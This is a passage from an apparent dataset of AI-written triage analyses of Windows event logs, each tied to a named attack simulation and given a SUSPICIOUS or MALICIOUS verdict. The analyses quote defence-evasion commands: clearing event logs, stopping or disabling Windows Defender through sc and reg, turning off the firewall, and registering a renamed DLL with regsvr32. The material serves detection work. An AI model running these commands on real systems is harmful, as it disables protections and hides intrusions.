The combination of batch file operations, PowerShell scripts modifying file attributes, and elevated processes repeatedly executed in a short time frame raises suspicions. Moreover, the lack of any supplementary logs in the system or security sections may imply an absence of typical activity logging, potentially indicating tampering or inadequate auditing.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- **Further Investigation**: Examine the origin and intention behind the processes, particularly `cmd.exe` and `powershell.exe` operations in relation to `data.txt`.
- **Audit Security**: Validate the authenticity of `MicrosoftEdgeUpdate` processes as updates, ensure they're from legitimate update channels, and rule out any unauthorized changes.
- **Review Policies**: Ensure security policies around script execution and process auditing are sufficiently enforced to detect and halt potentially unauthorized actions.
- **File Integrity Checks**: Conduct integrity checks on critical files and monitor changes in file attributes or locations to detect potential tampering or obfuscation efforts."
Clear Logs,"Based on the provided logs, here is the detailed analysis:

1. **Process Execution**: The logs show multiple executions of system utilities like `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, `wevtutil.exe`, and `conhost.exe`. These utilities are part of the standard Windows Operating System and are being executed by a user with `High` integrity level. This indicates the user has administrative privileges. The execution does not immediately suggest malicious intent, as these tools can be typically used for administrative tasks.

2. **Command-Line Usage**: A notable command executed is `cmd.exe /c wevtutil cl System`, which indicates that someone is clearing the System event log. This activity is suspicious because clearing event logs can be a tactic used by attackers to cover their tracks after compromising a system.

3. **Service and Application Activity**: The Microsoft Edge Update (`edgeupdate`) service is repeatedly started and stopped, which may be a part of regular update processes for the Microsoft Edge browser. The presence of `MicrosoftEdgeUpdate.exe` is legitimate and corresponds to the Edge browser update mechanism, and there's no additional evidence from the logs suggesting it was involved in a compromise.

4. **Privilege Levels**: Many processes, especially those related to Microsoft Edge Update, are running at `System` integrity level, associated with `NT AUTHORITY\SYSTEM` user, which would be typical for system-level services. There's no indication of unauthorized privilege escalation attempts within the records provided.

5. **Analysis Conclusion**: The execution of `cmd.exe /c wevtutil cl System` prompts concern as it might indicate intentional log clearing, a tactic often used post-exploitation. However, without additional context or evidence (such as traces of malicious payload execution, or unauthorized user activities), it is difficult to conclusively categorize this behavior as malicious based solely on these logs.

**Resolution**:
- **SUSPICIOUS**: The logs contain indicators (specifically, the clearing of the System event log) that suggest potentially concerning activity which warrants further investigation. It is advisable to verify if the user `SERVER002\admin_test` had a legitimate reason for executing these commands. Monitoring for any further suspicious activities, checking for any traces of lateral movement or persistence mechanisms, and reviewing access records around these timestamps can provide additional insights."
DLP Evasion via Sensitive Data in VBA Macro over email,"Upon reviewing the Windows event logs provided, the following observations and analysis can be made:

1. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - The logs show several instances of `wevtutil.exe` and `conhost.exe` executing. While these are legitimate Windows system processes used for event log management and console windows respectively, their repeated and rapid invocation could be indicative of a script or automated task running. This warrants further investigation to determine the intent and source of these executions. The user executing these processes is ""SERVER002\admin_test,"" which appears to be an administrative account.

2. **Execution of `hostname.exe` and `whoami.exe`:**
   - `hostname.exe` and `whoami.exe` are both legitimate system utilities. Their execution is not typically suspicious unless seen in context with other unusual activities. As standalone events, they do not directly suggest malicious activity.

3. **Powershell Activity:**
   - The execution of `powershell.exe` with the `Send-MailMessage` cmdlet is suspicious. It indicates an attempt to send an email using a locally hosted SMTP server (127.0.0.1) with an attachment that appears to be a macro-enabled Excel file (`data-cc-macro.xlsm`). This behavior is commonly observed in malicious activities, particularly data exfiltration or lateral movement attempts via email. 
   - Furthermore, the PowerShell log entries correspond to the execution of this script, confirming that the script ran and certain providers within PowerShell were initialized.

4. **Security Log Observation:**
   - The security log events detail an attempted credential operation that consistently failed (`ReturnCode"":""3221226021`). The description suggests issues with account or token operations, which could potentially indicate an attempt to access or manipulate credential-related information. However, these attempts failed, as indicated by the zero credentials returned.

5. **System Log:**
   - There are no notable entries in the system log for further context or analysis.

**Assessment:**
- **Suspicious**: The activity involving PowerShell, particularly the `Send-MailMessage` cmdlet with a macro-enabled Excel attachment, raises a red flag. This, in conjunction with rapid and repeated usage of `wevtutil.exe` and `conhost.exe` by administrative accounts, indicates potentially automated or scripted activity that is not typical for standard operations. While there is no definitive evidence of malicious activity (such as a confirmed data breach or successful privilege escalation), the patterns observed warrant further investigation.

**Recommended Actions:**
1. Investigate the context and source of the PowerShell command to determine its origin and purpose.
2. Review user activity for `SERVER002\admin_test` around the timestamp of these events for further insight.
3. Check network activity logs, particularly for outgoing connections, around the event times to identify any potential data exfiltration attempts.
4. Conduct a thorough scan for potential malware or unauthorized scripts on the system.

Based on the suspicious activity identified, the resolution is set to **SUSPICIOUS**."
Rundll32 setupapi.dll Execution,"Upon reviewing the provided Sysmon logs, I noticed the following potential indicators of anomalous or malicious activity:

1. **Unusual Process Execution Sequence**:
   - Execution of `cmd.exe` with a command line calling `rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\src\data.011_DefaultInstall.inf""`. This command line is used to execute an INF file, which can be an indicator of a malware installation or execution script, especially when launching from a temporary directory.

2. **Processes Run by `admin_test` Account**:
   - The `admin_test` account has executed several system utilities and processes in rapid succession (`powershell.exe`, `wevtutil.exe`, `cmd.exe`, `hostname.exe`, `conhost.exe`, etc.). While some of these commands (like `whoami.exe` and `hostname.exe`) can be used for reconnaissance in legal activities, their collective use in this short timeframe raises suspicion.

3. **Location of Executable Files**:
   - The scripts and commands executed involve paths indicating execution from a `Temp` folder (e.g., `data.011_DefaultInstall.inf`), often characteristic of temp storage for malware payloads.
   
4. **High Integrity Level Execution**:
   - Processes ran at a high integrity level, indicating they are executed with elevated privileges, which can be an indication of a privilege escalation attempt.

5. **Use of `rundll32.exe`**:
   - `rundll32.exe` is a legitimate Windows application that can be exploited to run malicious scripts or payloads. The context in which it's being used in conjunction with `setupapi.dll` points toward potentially malicious behavior.

Based on these observations, my detailed assessment points towards potential malicious activity given the combination of seemingly benign system utilities used in a manner that aligns with known tactics for installing malware or performing unauthorized administrative tasks.

**Resolution**: MALICIOUS

**Guidance**:
- Immediately isolate the host from the network to prevent further potential malicious actions or information leakage.
- Conduct a full malware scan and forensic analysis of the host to confirm and identify any payloads or malware.
- Review permissions and recent changes to user accounts, especially focusing on the `admin_test` account.
- Check for any unauthorized network connections or data exfiltration attempts.
- Strengthen monitoring and alerting for similar patterns in your environment to catch such attempts early."
Event Viewer Registry Modification - Redirection URL,"Upon analyzing the provided Windows event logs, here are my findings:

1. **Command Execution and Registry Modification**: 
   - There is an event at `2024-10-24 16:59:49.5663542` in the Sysmon logs where a `cmd.exe` process is executed to modify the registry. The command being run is: `""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""file://C:\windows\system32\notepad.exe"" /f`. This command attempts to change a registry value to redirect or modify URL behavior for Event Viewer, pointing towards a potential persistence mechanism or an intentional redirect for malicious purposes.

2. **Process Activities**: 
   - Multiple executions of system commands such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `wsqmcons.exe` by the user `SERVER002\admin_test` are observed. However, the sequence of whoami and wevtutil executions looks more like systematic, routine commands executed in a likely scripted manner or part of an automated process, especially given their close timing in the logs.
   - The execution of `wsqmcons.exe`, `taskhostw.exe`, and system updates such as `MicrosoftEdgeUpdate.exe` seems benign as these processes are part of the Windows update and Windows SQM (Software Quality Metrics) tasks, typically expected in a Windows environment.

3. **Edge Update Activities**:
   - Numerous events are related to Microsoft Edge Update, indicating normal updating activities. These involve update processes being executed by `NT AUTHORITY\SYSTEM`, suggesting they are legitimate system-level updates.

**Analysis Summary**:
- The use of `cmd.exe` to modify the registry for potential URL redirect in combination with `wevtutil.exe` (a tool to manage and query event logs) could indicate a suspicious action, potentially aiming for persistence or evasion technique (not standard user activity). However, the logs do not provide enough context to fully confirm malicious intent without additional corroborative events.

**Assessment**: The logs contain activities that could suggest suspicious behavior needing further investigation, particularly focusing on why and how the registry was being modified with `cmd.exe`.

**Resolution**: **SUSPICIOUS** - The modification of registry settings and the presence of typical system processes in quick succession without clear context warrants deeper investigation into the intentions and the actor behind these actions. Further investigation should determine the context and reason for the registry modification and the execution chain leading to it."
Activate Windows NoFileMenu Group Policy Feature,"After carefully analyzing the provided Windows event logs, here is the detailed assessment:

### Observations and Analysis:

1. **Time Manipulation Events:**
   - There are multiple `EventID 1` and `EventID 4616` associated with the change in system time. The `svchost.exe` process executed with `ProcessID 6684` has changed the system time.
   - The `TimeCreated` for these events is suspiciously close, suggesting rapid time adjustments, which is not typical behavior for regular operations, although the `svchost.exe` process is commonly used for legitimate Windows operations.

2. **Privilege Escalation and Logon Events:**
   - `EventID 4672` indicates privileged operations involving the user `admin_test` with a series of high-level privileges typically associated with administrative tasks like `SeDebugPrivilege`.
   - `EventID 4624` shows successful logon sessions with `LogonType 3` suggesting network-related logon activity for `admin_test`, initiated from the IP `192.168.0.102`.

3. **Command Line and Registry Modification:**
   - A series of `Sysmon` events show process creations with sensitive command lines. Specifically, an instance of `cmd.exe` executes a registry modification: 
     ``` 
     cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f
     ```
   - This behavior can indicate an attempt to hide or restrict access to certain functionalities in Windows Explorer, which might signify an attempt to cover malicious activity or ensure persistence.

4. **Use of Windows Utilities:**
   - The repeated use of Windows utilities such as `wevtutil.exe`, `reg.exe`, and `svchost.exe` was noted. While these are common tools, their misuse is a common tactic to perform evasive and malicious activities silently.

5. **Frequent Execution of Edge Update Processes:**
   - The `Sysmon` logs reveal heavy use of `MicrosoftEdgeUpdate.exe`, which could be routine updates, but considering the timing and frequency amidst other suspicious activities, it warrants further investigation.

### Assessment:

Given the combination of unusual time changes, privilege escalation, command line activity modifying registry settings, and the use of Windows built-in processes in quick succession, the activity appears to be suspicious.

### Recommended Action and Conclusion:

- **Resolution:** **SUSPICIOUS**
- **Guidance:**
  - Conduct further investigation into the source of the `192.168.0.102` IP address involved in the network logon.
  - Review the context and justification for system time changes occurring via `svchost.exe`.
  - Examine the `admin_test` user’s activities and system configurations to identify any unauthorized changes.
  - Check for persistence mechanisms and potential registry tweaks that could indicate malicious intent.
  - Monitor for any further unusual administrative tasks or unauthorized command executions.

Further in-depth analysis and possibly threat hunting procedures are advisable to confirm or refute the presence of malicious activities or actors."
Modify EnableNonTPM Registry entry,"**Analysis of the Windows Event Logs**

Upon reviewing the provided logs from the Windows machine, several key events and their associated processes stand out:

1. **Event ID 5 - Sysmon Process Create Events:**
   - Multiple instances of legitimate Windows processes such as `wevtutil.exe`, `conhost.exe`, and `svchost.exe` are observed. Most notably, `wevtutil.exe` and `conhost.exe` are repeatedly run by the user `SERVER002\\admin_test`.
   - Execution of `wevtutil.exe` and `conhost.exe` could be normal, but frequent executions in rapid succession, especially when run as an elevated user, can suggest log tampering or an attempt to hide malicious activities.

2. **Event ID 1 - Process Creation:**
   - `cmd.exe` executed with command-line arguments involving registry modifications (`reg add` commands) under high integrity level, executed as `SERVER002\\admin_test`. The particular command targets BitLocker settings (`EnableNonTPM`), which can imply an attempt to alter drive encryption settings.
   - `whoami.exe` and `hostname.exe` executions can be typical for checking the logged-in user and hostname but can also assist in gaining system profile information.

3. **Persistence or Privilege Escalation:**
   - The registry modification command executed by `cmd.exe` suggests potential persistence mechanisms or privilege escalations being set up (e.g., modifying BitLocker settings without hardware-based TPM).
   - Activities are performed within a high integrity context, indicating privileged operations are being executed, likely with administrative rights.

4. **Normal Scheduled Services:**
   - `sppsvc.exe` and system-related processes such as `svchost.exe` are consistent with normal system operations and Windows services handling.

5. **Application Logs:**
   - `Software Protection Platform Service` logs confirm that software protection activities are taking place but do not suggest out-of-the-ordinary behavior alone.

**Assessment:**

- **Suspicious Activity:**
  - The rapid and repetitive invocation of `wevtutil.exe` and `conhost.exe` in the logs may indicate an attempt to manipulate event logs or related system operations.
  - The specific execution of `cmd.exe` with registry modification commands targeting BitLocker raises the risk of non-TPM policies being manipulated for ulterior objectives.

**Resolution: SUSPICIOUS**

Given the context of registry modifications and potentially benign but unusual administrative activity, this activity should be considered **suspicious**. Further investigation is warranted into the `admin_test` account actions, particularly those modifying system policies or configurations. Log reviews and account audits should be initiated to determine the intent behind these operations, and proper mitigation strategies should be deployed if necessary."
Tamper with Windows Defender Command Prompt,"Upon reviewing the provided Windows event logs from the system, a few points stand out that indicate potential malicious activity:

1. **Suspension of Security Features (Sysmon Log)**
   - A `cmd.exe` process executed a command to stop the Windows Defender service (`WinDefend`) and reconfigure it to not start automatically. The command line was `""cmd.exe"" /c sc stop WinDefend & sc config WinDefend start=disabled & sc query WinDefend` executed by `SERVER002\admin_test` user at a high integrity level.
   - Disabling security features like Windows Defender can be a significant indication of an attempt to weaken system defenses, commonly associated with malicious activity.

2. **Repeated Execution of `wevtutil.exe` and `conhost.exe` (Sysmon Log)**
   - Multiple instances of both `wevtutil.exe` and `conhost.exe` are executed by the same user (`SERVER002\\admin_test`).
   - While not inherently malicious, `wevtutil.exe` is often used to clear or manipulate event logs, which can be a part of post-exploitation activities to hide tracks.

3. **Edge Update Process Activity (Application and Sysmon Logs)**
   - Several logs are related to `MicrosoftEdgeUpdate.exe` running system updates. This alone is generally benign as it is part of the standard update process.
   - However, its persistence and the execution from a temporary directory (e.g., `C:\\Program Files (x86)\\Microsoft\\Temp\\EU9E2A.tmp`) are somewhat unusual and could warrant additional scrutiny.

4. **System Time Change (System and Security Logs)**
   - There are documented changes in system time (Event ID 4616) initiated by `svchost.exe`. Changes to system time can be used to manipulate the timestamps of logs to cover tracks of unauthorized activities.

The behavior exhibited by these logs suggests an attempt to impair system defenses and cover up tracks potentially. The following steps are recommended:

- **Further Investigation and Monitoring:**
  - Verify the legitimacy of the user account (`SERVER002\\admin_test`) and the purpose of their scheduled tasks or scripts.
  - Investigate the origin of the command that disabled Windows Defender.
  - Review additional logs or security tools for signs of data exfiltration or lateral movement.
  - Check for any unauthorized changes or additions to scheduled tasks or startup configurations.

Based on these observations, the situation is flagged as **MALICIOUS**. Measures should be taken to isolate the affected system, conduct a full security scan, and potentially restore it to a known good state to prevent further compromise."
Allow RDP Remote Assistance Feature,"**Detailed Analysis of the Logs:**

1. **Time Change Events:**
   - The System Logs and Security Logs show several changes in system time, occurring within milliseconds. These are tied to the `svchost.exe` process, which commonly acts as a host process for Windows services. 
   - Time manipulation in logs can be suspicious if not tied to expected service activities; however, without any irregular behavior preceding or following these events, they seem more aligned with a service synchronizing time with `time.windows.com`. 
   
2. **Process Execution and Command-Line Arguments:**
   - In the Sysmon logs, there is a record of `cmd.exe` executing a command to add a registry entry: `reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f`.
   - Modifying registry entries, especially those related to terminal services, can be indicative of attempts to set up unauthorized remote access or privilege escalation.
   - Other processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are seen frequently and without suspicious command-line arguments. Their use seems consistent with administrative tasks.

3. **User and Process Context:**
   - The majority of processes in the logs are executed by the user `SERVER002\admin_test`, except for necessary system services like `TrustedInstaller.exe` and `TiWorker.exe` running as `NT AUTHORITY\SYSTEM`.
   - There's no indication of unusual privilege escalation within the logs themselves, as the processes being executed mostly maintain high integrity levels.

4. **Network and External Service Connections:**
   - No explicit external connections or unusual network activity are indicated in the logs provided. The time service contact with `time.windows.com` is standard.

**Assessment of the Situation:**
- The main potential indicator of concern here is the modification of a registry key associated with Terminal Services via `cmd.exe`. This activity could align with an attempt to configure the system for remote access or altering the default settings.

**Threats or Risks Identified:**
- The registry modification indicates a risk of unauthorized remote access being enabled on this server. If this change was not authorized or part of legitimate system administration, it could be a precursor to setting up persistent remote access.

**Guidance on How to Proceed:**
- Verify with system administrators whether the registry change was part of legitimate activity or a scheduled change.
- If unauthorized, further investigate the source and intent of this change.
- Monitor the server for unusual login attempts or remote connections.
- Conduct a full security review of the current network and system access policies.

**Final Resolution: SUSPICIOUS**
- This conclusion derives from the suspicious registry alteration which, while not immediately malicious, potentially poses a security threat requiring further investigation to rule out malicious intent."
Remove Network Share,"### Analysis of Windows Event Logs

#### Security Log
- **Event ID 4616**: This event indicates a change in system time. The system time was slightly adjusted, which could be caused by NTP time synchronization. The process involved (`svchost.exe`) under LOCAL SERVICE is typical behavior for time adjustments. This is generally benign unless occurring in conjunction with other suspicious activities.

#### Application Log
- **EventID 0 (edgeupdate)**: The logs indicate that a service related to Microsoft Edge Update stopped. This event commonly occurs during routine updates or service restarts and is not inherently suspicious.

- **EventID 16384 (Software Protection Platform Service)**: The Software Protection Platform Service log entries are standard and typical for license validation and activation processes.

#### Sysmon Log
- **Event ID 1 and 5**: The Sysmon logs provide details about process creation and termination.
  - **Unusual Execution**: Multiple instances of system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`) are running by a user (`SERVER002\\admin_test`) with high integrity levels. While the utilities themselves are legitimate, their concurrent execution, especially with commands like `net share \\test\share /delete`, could indicate administrative tasks or potentially malicious script activity.
  - **Command Execution**: The `cmd.exe` used to delete a network share is somewhat unusual, suggesting possible unauthorized or misconfigured script execution.

- **Edge Update Entries**: Regular entries for Microsoft Edge Update processes being created and executed, with no overt indicators of malicious behavior. They seem consistent with software update activities.

#### System Log
- **Event ID 1 and 24 (Kernel-General)**: These logs reflect system time adjustments, likely due to synchronization with the time server. The involvement of `svchost.exe` and regular time services is expected behavior, indicating a benign activity unless manipulated frequently with ill intentions.

### Assessment:

Based on the logs:

1. There is evidence of **legitimate system activities**, including time synchronization and software updates (Microsoft Edge).
2. The presence of standard utilities being executed by `admin_test` is not inherently malicious but raises some flags:
   - The execution of commands like `net share /delete` could be part of a script or administrative task, yet it deserves attention to confirm legitimacy and necessity.

### Conclusion
**Resolution**: **SUSPICIOUS**

**Recommendation**:
- Conduct further investigation into the `SERVER002\\admin_test` session activities, particularly the reasons for the `net share /delete` command.
- Confirm whether the executed commands were part of scheduled tasks, administrative scripts, or induced by a legitimate user's remote session.
- Review user permissions and ensure that logon sessions are appropriately monitored for similar activities.
- Validate the integrity and source of any scripts or administrative tasks that might execute such commands to rule out misuse or compromise."
Regsvr32 Registering Non DLL,"## Detailed Analysis of the Logs:

### Indicators of Malicious Activity:

1. **Command Execution Anomalies:**
   - **Copying System File:** 
     - Event Record ID 17956 indicates that `cmd.exe` was used to copy a system DLL file (`shell32.dll`) to a temporary location with a `.jpg` extension. This behavior is unusual as it involves renaming a DLL file, which can be an indicator of a staging phase for DLL sideloading or execution.
   - **Registering a Non-DLL File:**
     - Event Record ID 17995 involves the execution of `regsvr32.exe` to register a file named `shell32.jpg`, which was originally a DLL. Registering a non-DLL file or a misnamed DLL is a strong indicator of malicious activity, as this technique may be used to bypass security measures or execute code covertly.

2. **Execution of Utilities Possibly for Evasive Purposes:**
   - We observe the execution of several instances of `hostname.exe` and `whoami.exe`. While these utilities are legitimate and part of normal administrative tasks, their execution in quick succession might suggest an attempt to profile the system or user context by potentially malicious scripts or processes.

3. **Time Service Manipulation:**
   - The logs show that the system time was updated, which might be part of normal synchronization with NTP servers (`time.windows.com`). However, in an adversarial context, altering the system time can be used to evade detection or alter timestamp traces to confuse log-based investigations.

4. **Unusual Use of `wevtutil.exe`:**
   - The frequent invocation of `wevtutil.exe` could indicate attempts to clear specific event logs or gather log data, possibly to cover tracks of a malicious actor or gain more insights into system activities.

### Assessment:

From the identified entries, particularly the suspicious renaming and registration of a system DLL file, combined with the use of `regsvr32.exe` for potentially unauthorized file registration, this behavior represents a known tactic often used in malware operations to execute payloads stealthily. The enumeration of environment details using `hostname.exe` and `whoami.exe`, alongside potential log manipulation activities, further supports this assessment.

### Recommendation and Resolution:

- **Resolution: MALICIOUS**

Given the identified indicators and their alignment with known malicious techniques, it is assessed that the logs contain evidence of malicious activity.
  
### Guidance on How to Proceed:

1. **Isolate the Host:**
   - Immediately isolate the affected host (`Server002`) from the network to prevent further propagation or data exfiltration.

2. **Forensic Investigation:**
   - Collect a complete forensic image of the system for in-depth analysis.
   - Investigate the source and modifications made to the `shell32.jpg` file registered by `regsvr32.exe`.
   - Analyze network traffic logs around the time of suspicious activities for unusual patterns or communications.

3. **Threat Containment:**
   - Inspect other systems for similar indicators to ensure containment of the threat.
   - Review recent administrative activities and permissions granted on the system to identify potential points of exploitation.

4. **Increase Monitoring and Alerting:**
   - Set up strict monitoring of further attempts to use `regsvr32.exe` across the network.
   - Enable detailed Sysmon rules to catch similar patterns in future attempts.

5. **Review Patch and Update Policies:**
   - Ensure the system is updated with the latest security patches.
   - Regularly review security policies to prevent misuse of legitimate tools by threat actors.

Through these steps, further potential threats can be mitigated, and insight can be gained into the intrusion vector for proactive defense measures."
LockBit Black - Unusual Windows firewall registry modification -Powershell,"## Detailed Analysis of the Logs

Upon analyzing the provided Windows event logs, I have identified several key points which merit closer inspection:

1. **PowerShell Activity:**
   - The PowerShell logs display commands that modify the Windows Firewall settings by setting the `EnableFirewall` property to `0` (disabled) for both the domain and standard profiles. This type of activity is typical of an attacker attempting to lower the security posture of a system, thereby increasing its vulnerability.
   - The command was executed by the user `SERVER002\admin_test` with a high integrity level, indicative of administrative privilege usage.

2. **Sysmon Logs:**
   - The Sysmon logs provide additional confirmations of PowerShell execution (`powershell.exe`) with command-line arguments that match those observed in the PowerShell logs. This corroborates that the command was executed and matches the event logged in Windows PowerShell.
   - Multiple executions of system utilities such as `wevtutil.exe`, `conhost.exe`, and `svchost.exe` are present. While these entries are common in legitimate operations, the `wevtutil.exe` entries are somewhat repetitive, suggesting potential log modifications or extensive querying.
   - The processes executed by `admin_test` and `NT AUTHORITY\SYSTEM` reveal elevated access with system integrity, adding context that these actions had substantial privileges.

3. **Edge Update Processes:**
   - The logs show multiple entries for `MicrosoftEdgeUpdate.exe`, implying frequent updates or checks which could be typical of software running normally.
   - There are no suspicious command-line arguments or other indicators in these entries suggesting malicious behavior from the Edge update processes themselves.

## Assessment and Conclusion

- **Anomalous Behavior:**
  - The PowerShell commands that disable the firewall for both domain and standard profiles stand out as highly suspicious and potentially dangerous. Disabling the firewall without a legitimate administrative change control reason exposes the system to significant risk.

- **Other Activities:**
  - While several system-level processes are executed, none exhibit inherently malicious patterns besides the noted PowerShell activity. Both `HOSTNAME.EXE` and `whoami.exe` execution are common in administrative or script-based tasks but do not exhibit malicious signatures.

## Final Resolution

Based on the analysis:

- **MALICIOUS:** Given the evidence of an administrative account executing commands that significantly lower the security configuration of the system by disabling the Windows Firewall through PowerShell, this is unequivocally deemed malicious activity.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - **Isolate the Affected Host:** To prevent further unauthorized access or potential spread.
   - **Change Administrative Credentials:** As a precaution, change credentials for the `admin_test` account and review all accounts with elevated privileges.
   - **Re-enable Firewall:** Manually re-enable the Windows Firewall settings as per organization and security policy standards.

2. **Investigation:**
   - Investigate how the user account `admin_test` was able to execute such potentially harmful commands.
   - Look for additional signs of compromise across related systems or unusual user behavior in logs.

3. **Long-term Actions:**
   - Review and strengthen firewall policies to prevent alteration by unauthorized scripts or users.
   - Consider implementing stricter monitoring on PowerShell script logging for early detection of similar activities in the future."
Take ownership using takeown utility,"Upon reviewing the Windows event logs from the provided collection, here is a detailed analysis of the entries and a determination of their nature:

### **Analysis:**

1. **PowerShell Log:**
   - The PowerShell log section is empty, indicating no suspicious or unusual PowerShell activity, which is often an indicator of malicious scripts or exploits if present.

2. **Security Log:**
   - **EventID 4616** indicates a system time change which is often benign. It's typically related to network time synchronization or standard system operations. The presence of `svchost.exe` executing this is normal as it acts for many services.

3. **System Log:**
   - Multiple entries showing `EventID 24` and `EventID 1` related to time changes, noted by `svchost.exe`. These entries support the time synchronization activities observed in the Security Log.

4. **Application Log:**
   - Entries showed the stopping of the `edgeupdate` service. Given the proximity to system updates, this action appears maintenance-related, especially with Microsoft Edge Update processes in the logs.

5. **Sysmon Log:**
   - **cmd.exe** activities with commands such as `mkdir`, `takeown.exe`, and `echo` indicate scripts or operations designed for file manipulation and permission changes. The use of `takeown.exe` is unusual and can be considered suspicious due to its role in taking ownership of files, which is often abused in exploits.
   - High Integrity Level operations by `SERVER002\admin_test` performing `takeown` command stands out, as `takeown` is a tool often used for privilege escalation.
   - Legitimate operations like `whoami.exe` and `hostname.exe` appear exploratory, potentially by an admin or script.
   - Several Microsoft Edge Update related processes (`MicrosoftEdgeUpdate.exe`), operating under `NT AUTHORITY\SYSTEM`, check out as routine updates.

### **Assessment:**

The behavior in the logs indicates a mix of regular system update activities and some suspicious command-line executions, specifically the usage of `takeown.exe`, which is often leveraged in privilege escalation scenarios. However, without further context, such as network logs, other user actions, or a continuation of this unusual activity, it's challenging to confirm these actions as malicious definitively.

### **Conclusion:**

**Resolution: SUSPICIOUS**

- The presence and context of operations with `takeown.exe`, particularly under a high-integrity admin context, raise a potential red flag. This activity warrants additional investigation.
- Recommend scrutinizing the user `SERVER002\admin_test` for unauthorized permission changes or access attempts.
- It's advised to check if `takeown.exe` usage aligns with known administrative tasks or if it's an indicator of unauthorized privilege escalation attempts.
- Further analysis should include correlating these logs with any network anomalies or external connections during the same timeframe."
Tamper with Windows Defender Registry - Reg.exe,"After reviewing the provided Windows event logs, we can identify several significant indicators that suggest malicious activity:

1. **Disabling Security Features:**
   - The Application log shows repeated entries of ""Windows Defender, SECURITY_PRODUCT_STATE_OFF,"" which indicates that Windows Defender has been disabled. This is a critical security concern as it leaves the system vulnerable to malware and other threats.
   - The Sysmon log shows a command execution through `cmd.exe` to manipulate registry entries under ""HKLM\Software\Policies\Microsoft\Windows Defender"" and its subkeys aimed at disabling various protective features of Windows Defender (e.g., DisableAntiSpyware, DisableAntiVirus, DisableRealtimeMonitoring).

2. **Suspicious Command-Line Activity:**
   - The command executed through `cmd.exe` includes a series of `reg add` commands to disable several Windows Defender real-time protections. This behavior is often seen in malware trying to neutralize defense mechanisms to operate undetected.
   
3. **Unusual Execution Patterns:**
   - Frequent command-line executions such as `whoami.exe`, `hostname.exe`, and `conhost.exe` around the same timeframe can be indicative of reconnaissance activity or attempts to establish persistence.

4. **Sensitive Time Adjustments:**
   - The Security and System logs both reflect events where the system time was changed abruptly. Time tampering can be indicative of attackers attempting to disrupt logging or timestamp continuity, either to evade detection or to conceal activities.

5. **Service Interruptions:**
   - In the Application log, services related to `edgeupdate` are seen as stopping, which, although lacking direct suspicious intent, could correlate with other events that warrant deeper inspection.

Based on these observations, the activity within these logs indicates clear malicious intent, primarily due to the deliberate disabling of security protections and attempts to evade detection.

**Resolution: MALICIOUS**

**Recommended Actions:**
- Immediately re-enable Windows Defender and all its associated protections.
- Conduct a thorough scan of the system with updated malware definitions.
- Check for unauthorized changes to critical system and security settings.
- Monitor for any further suspicious activities and reinforce logging to capture future occurrences.
- Consider isolating the affected system to prevent potential spread within the network and perform a more detailed forensic analysis.
- Review and enhance security policies to prevent registry alterations and unauthorized privilege use.

This assessment should be considered a high priority, and appropriate incident response procedures should be initiated."
DLP Evasion via Sensitive Data in VBA Macro over HTTP,"Upon reviewing the provided Windows event logs from the security, system, PowerShell, and Sysmon channels, several entries suggest potentially abnormal activities, which need further investigation:

1. **Event 4616 (Security Log)**: 
   - The time synchronization logs (`EventID 4616`) indicate that there were adjustments to the system time. This could be legitimate, but frequent or unexpected time changes can sometimes be used by attackers to evade detection or manipulate system logs.

2. **Event 5379 (Security Log)**: 
   - Multiple events indicating no credentials could be read for `MicrosoftAccount:user` and `WindowsLive:(token/cert)`. The return code `3221226021` typically indicates an invalid handle, which might suggest failures in accessing certain credential objects. While this alone is not necessarily malicious, it could warrant further review to ensure credentials have not been tampered with or are not being attempted to access improperly.

3. **PowerShell Events (EventID 600)**:
   - PowerShell is being used (`powershell.exe & {Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-cc-macro.xlsm\""}`), to send a potentially sensitive file (`data-cc-macro.xlsm`). Sending files through PowerShell in this manner can be indicative of data exfiltration efforts or execution of malicious macros.

4. **Elevation of Privileges (Event 4672, Security Log)**:
   - The user `admin_test` is logged with special privileges such as SeDebugPrivilege and others, which, when seen with abnormal activity, could indicate possible privilege escalation or preparation for lateral movement.

5. **Sysmon Logs (Process Creation)**:
   - Execution of PowerShell and other command line operations by `admin_test`, with high integrity level and utilizing tools such as `whoami`, `hostname`, and `wevtutil` (used for exporting and clearing event logs), can suggest reconnaissance activities and attempts at covering tracks. These activities, combined with PowerShell execution, raise concerns.
   
6. **Frequent Command-Line Activities (Sysmon Logs)**:
   - The sequence and types of command execution, including use of `wevtutil`, is suspicious. `wevtutil.exe` is known to be used to export or modify event logs, which could suggest log tampering.

Based on these observations, the overall activity looks **SUSPICIOUS**. While some actions may be legitimate admin tasks, the particular combination of time changes, PowerShell data transfers, key security privileges, and common attack-related executables like `wevtutil` aligns with known tactics, techniques, and procedures (TTPs) associated with malicious behavior. 

### Recommendations:
- **Further Investigation**: Engage with the host’s user (`admin_test`) to verify these activities. If the user cannot justify the actions, deeper forensic analysis may be necessary.
- **Network Monitoring**: Monitor network traffic for unusual patterns or external communications that could indicate data exfiltration or command-and-control (C2) activities.
- **Log Integrity**: Check for any tampering with logs and reinforce log integrity measures.
- **Security Policies**: Evaluate and potentially tighten PowerShell execution policies and monitor script executions.
- **Credential Security**: Ensure all user credentials, especially privileged accounts, follow strong, multi-factor authentication practices.
- **Host Isolation**: Depending on the further findings and potential signs of compromise, consider isolating the host to prevent lateral movement.

Resolution: **SUSPICIOUS**. Further investigation is needed to ascertain the intent and legitimacy of the observed activities."
Disable Administrative Share Creation at Startup,"After reviewing the Windows event logs provided, the following points emerged as potentially suspicious and warrant further analysis:

